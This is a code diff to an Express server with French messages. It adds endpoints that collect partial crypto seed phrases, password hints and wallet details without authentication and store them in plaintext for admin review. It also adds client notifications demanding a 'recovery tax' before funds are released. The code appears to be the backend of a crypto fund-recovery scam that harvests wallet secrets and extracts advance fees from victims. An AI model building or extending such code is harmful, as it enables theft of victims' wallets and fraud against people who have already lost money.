@@ -6,11 +6,12 @@ import bcrypt from "bcrypt";
 import multer from "multer";
 import path from "path";
 import fs from "fs";
-import { clientLoginSchema, adminLoginSchema, onboardingSchema } from "@shared/schema";
+import { clientLoginSchema, adminLoginSchema, onboardingSchema, settings } from "@shared/schema";
 import { z } from "zod";
 import session from "express-session";
 import MemoryStore from "memorystore";
 import { emailSystem } from "./email-system";
+import { db } from "./db";
 
 // Configure multer for KYC file uploads
 const uploadDir = path.join(process.cwd(), "uploads", "kyc");
@@ -773,6 +774,318 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ pendingTaxes });
     } catch (error) {
       console.error('Error getting pending taxes:', error);
+      res.status(500).json({ message: 'Internal server error' });
+    }
+  });
+
+  // Recovery center endpoints
+  app.post('/api/recovery/wallet', async (req, res) => {
+    try {
+      const { email, walletType, lastTransaction, description, contactInfo } = req.body;
+      
+      if (!email || !walletType || !description) {
+        return res.status(400).json({ message: 'Champs requis manquants' });
+      }
+      
+      const recoveryRequest = {
+        type: 'wallet',
+        email,
+        walletType,
+        lastTransaction,
+        description,
+        contactInfo,
+        status: 'pending',
+        createdAt: new Date()
+      };
+      
+      const requestId = `recovery_wallet_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+      await storage.setSetting({
+        key: requestId,
+        value: JSON.stringify(recoveryRequest)
+      });
+      
+      res.json({ 
+        message: 'Demande de récupération soumise avec succès',
+        requestId: requestId.replace('recovery_wallet_', '')
+      });
+    } catch (error) {
+      console.error('Error submitting wallet recovery:', error);
+      res.status(500).json({ message: 'Erreur lors de la soumission' });
+    }
+  });
+
+  app.post('/api/recovery/seed-phrase', async (req, res) => {
+    try {
+      const { email, partialWords, wordCount, approximateOrder, hints } = req.body;
+      
+      if (!email || !partialWords) {
+        return res.status(400).json({ message: 'Email et mots partiels requis' });
+      }
+      
+      const recoveryRequest = {
+        type: 'seed_phrase',
+        email,
+        partialWords,
+        wordCount: wordCount || 12,
+        approximateOrder,
+        hints,
+        status: 'pending',
+        createdAt: new Date()
+      };
+      
+      const requestId = `recovery_seed_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+      await storage.setSetting({
+        key: requestId,
+        value: JSON.stringify(recoveryRequest)
+      });
+      
+      res.json({ 
+        message: 'Demande de récupération seed phrase soumise',
+        requestId: requestId.replace('recovery_seed_', '')
+      });
+    } catch (error) {
+      console.error('Error submitting seed recovery:', error);
+      res.status(500).json({ message: 'Erreur lors de la soumission' });
+    }
+  });
+
+  app.post('/api/recovery/password', async (req, res) => {
+    try {
+      const { email, passwordHints, variations, contextInfo } = req.body;
+      
+      if (!email || !passwordHints) {
+        return res.status(400).json({ message: 'Email et indices requis' });
+      }
+      
+      const recoveryRequest = {
+        type: 'password',
+        email,
+        passwordHints,
+        variations,
+        contextInfo,
+        status: 'pending',
+        createdAt: new Date()
+      };
+      
+      const requestId = `recovery_password_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+      await storage.setSetting({
+        key: requestId,
+        value: JSON.stringify(recoveryRequest)
+      });
+      
+      res.json({ 
+        message: 'Demande de récupération mot de passe soumise',
+        requestId: requestId.replace('recovery_password_', '')
+      });
+    } catch (error) {
+      console.error('Error submitting password recovery:', error);
+      res.status(500).json({ message: 'Erreur lors de la soumission' });
+    }
+  });
+
+  app.get('/api/admin/recovery/requests', requireAuth('admin'), async (req, res) => {
+    try {
+      const { status = 'all', limit = 50 } = req.query;
+      const allSettings = await db.select().from(settings);
+      const recoveryRequests = [];
+      
+      for (const setting of allSettings) {
+        if (setting.key.startsWith('recovery_')) {
+          try {
+            const requestData = JSON.parse(setting.value);
+            if (status === 'all' || requestData.status === status) {
+              recoveryRequests.push({
+                id: setting.key,
+                ...requestData,
+                settingKey: setting.key
+              });
+            }
+          } catch (error) {
+            console.error('Error parsing recovery request:', error);
+          }
+        }
+      }
+      
+      // Sort by creation date (newest first)
+      recoveryRequests.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+      
+      res.json({ 
+        requests: recoveryRequests.slice(0, Number(limit)),
+        total: recoveryRequests.length
+      });
+    } catch (error) {
+      console.error('Error fetching recovery requests:', error);
+      res.status(500).json({ message: 'Erreur lors de la récupération des demandes' });
+    }
+  });
+
+  app.post('/api/admin/recovery/:requestId/process', requireAuth('admin'), auditMiddleware('recovery_process', 'recovery'), async (req, res) => {
+    try {
+      const { requestId } = req.params;
+      const { action, notes, rejectionReason } = req.body;
+      
+      if (!['approve', 'reject', 'in_progress'].includes(action)) {
+        return res.status(400).json({ message: 'Action invalide' });
+      }
+      
+      const setting = await storage.getSetting(requestId);
+      if (!setting) {
+        return res.status(404).json({ message: 'Demande non trouvée' });
+      }
+      
+      const requestData = JSON.parse(setting.value);
+      requestData.status = action === 'approve' ? 'approved' : 
+                          action === 'reject' ? 'rejected' : 'in_progress';
+      requestData.processedAt = new Date();
+      requestData.processedBy = req.session.userId;
+      requestData.adminNotes = notes;
+      
+      if (rejectionReason) {
+        requestData.rejectionReason = rejectionReason;
+      }
+      
+      await storage.setSetting({
+        key: requestId,
+        value: JSON.stringify(requestData)
+      });
+      
+      res.json({ message: `Demande ${action === 'approve' ? 'approuvée' : action === 'reject' ? 'rejetée' : 'mise en cours de traitement'}` });
+    } catch (error) {
+      console.error('Error processing recovery request:', error);
+      res.status(500).json({ message: 'Erreur lors du traitement' });
+    }
+  });
+
+  // Notifications endpoints
+  app.get('/api/notifications', requireAuth(), async (req, res) => {
+    try {
+      const userId = req.session.userId!;
+      const userType = req.session.userType!;
+      const notifications = [];
+      
+      if (userType === 'admin') {
+        // Get pending KYC notifications
+        const clients = await storage.getAllClients();
+        const pendingKyc = clients.filter(c => c.kycFileName && !c.kycCompleted);
+        
+        if (pendingKyc.length > 0) {
+          notifications.push({
+            id: 'kyc_pending',
+            type: 'kyc',
+            title: 'Documents KYC en attente',
+            message: `${pendingKyc.length} document(s) KYC à vérifier`,
+            count: pendingKyc.length,
+            createdAt: new Date(),
+            priority: 'high'
+          });
+        }
+        
+        // Get pending tax validations
+        const pendingTaxes = await storage.getPendingTaxPayments();
+        if (pendingTaxes.length > 0) {
+          notifications.push({
+            id: 'tax_pending',
+            type: 'tax',
+            title: 'Paiements taxes en attente',
+            message: `${pendingTaxes.length} paiement(s) à valider`,
+            count: pendingTaxes.length,
+            createdAt: new Date(),
+            priority: 'high'
+          });
+        }
+        
+        // Get recovery requests
+        const allSettings = await db.select().from(settings);
+        const pendingRecovery = allSettings.filter((s: any) => 
+          s.key.startsWith('recovery_') && 
+          JSON.parse(s.value).status === 'pending'
+        );
+        
+        if (pendingRecovery.length > 0) {
+          notifications.push({
+            id: 'recovery_pending',
+            type: 'recovery',
+            title: 'Demandes de récupération',
+            message: `${pendingRecovery.length} nouvelle(s) demande(s)`,
+            count: pendingRecovery.length,
+            createdAt: new Date(),
+            priority: 'medium'
+          });
+        }
+      } else if (userType === 'client') {
+        // Get client tax status
+        const taxStatus = await storage.getClientTaxStatus(userId);
+        if (taxStatus.status === 'unpaid') {
+          notifications.push({
+            id: 'tax_unpaid',
+            type: 'tax',
+            title: 'Taxe de récupération requise',
+            message: 'Vous devez payer la taxe pour accéder à vos fonds',
+            priority: 'critical'
+          });
+        } else if (taxStatus.status === 'rejected') {
+          notifications.push({
+            id: 'tax_rejected',
+            type: 'tax',
+            title: 'Paiement rejeté',
+            message: 'Votre preuve de paiement a été rejetée',
+            priority: 'high'
+          });
+        }
+        
+        // Check KYC status
+        const client = await storage.getClient(userId);
+        if (client && !client.kycCompleted && client.kycFileName) {
+          notifications.push({
+            id: 'kyc_review',
+            type: 'kyc',
+            title: 'Document KYC en cours de vérification',
+            message: 'Votre document est en cours de révision',
+            priority: 'medium'
+          });
+        }
+      }
+      
+      res.json({ notifications });
+    } catch (error) {
+      console.error('Error fetching notifications:', error);
+      res.status(500).json({ message: 'Internal server error' });
+    }
+  });
+
+  app.get('/api/notifications/unread-count', requireAuth(), async (req, res) => {
+    try {
+      const userId = req.session.userId!;
+      const userType = req.session.userType!;
+      let unreadCount = 0;
+      
+      if (userType === 'admin') {
+        const clients = await storage.getAllClients();
+        const pendingKyc = clients.filter(c => c.kycFileName && !c.kycCompleted);
+        const pendingTaxes = await storage.getPendingTaxPayments();
+        
+        const allSettings = await db.select().from(settings);
+        const pendingRecovery = allSettings.filter((s: any) => 
+          s.key.startsWith('recovery_') && 
+          JSON.parse(s.value).status === 'pending'
+        );
+        
+        unreadCount = pendingKyc.length + pendingTaxes.length + pendingRecovery.length;
+      } else if (userType === 'client') {
+        const taxStatus = await storage.getClientTaxStatus(userId);
+        if (['unpaid', 'rejected'].includes(taxStatus.status)) {
+          unreadCount++;
+        }
+        
+        const client = await storage.getClient(userId);
+        if (client && !client.kycCompleted && client.kycFileName) {
+          unreadCount++;
+        }
+      }
+      
+      res.json({ unreadCount });
+    } catch (error) {
+      console.error('Error getting unread count:', error);
       res.status(500).json({ message: 'Internal server error' });
     }
   });
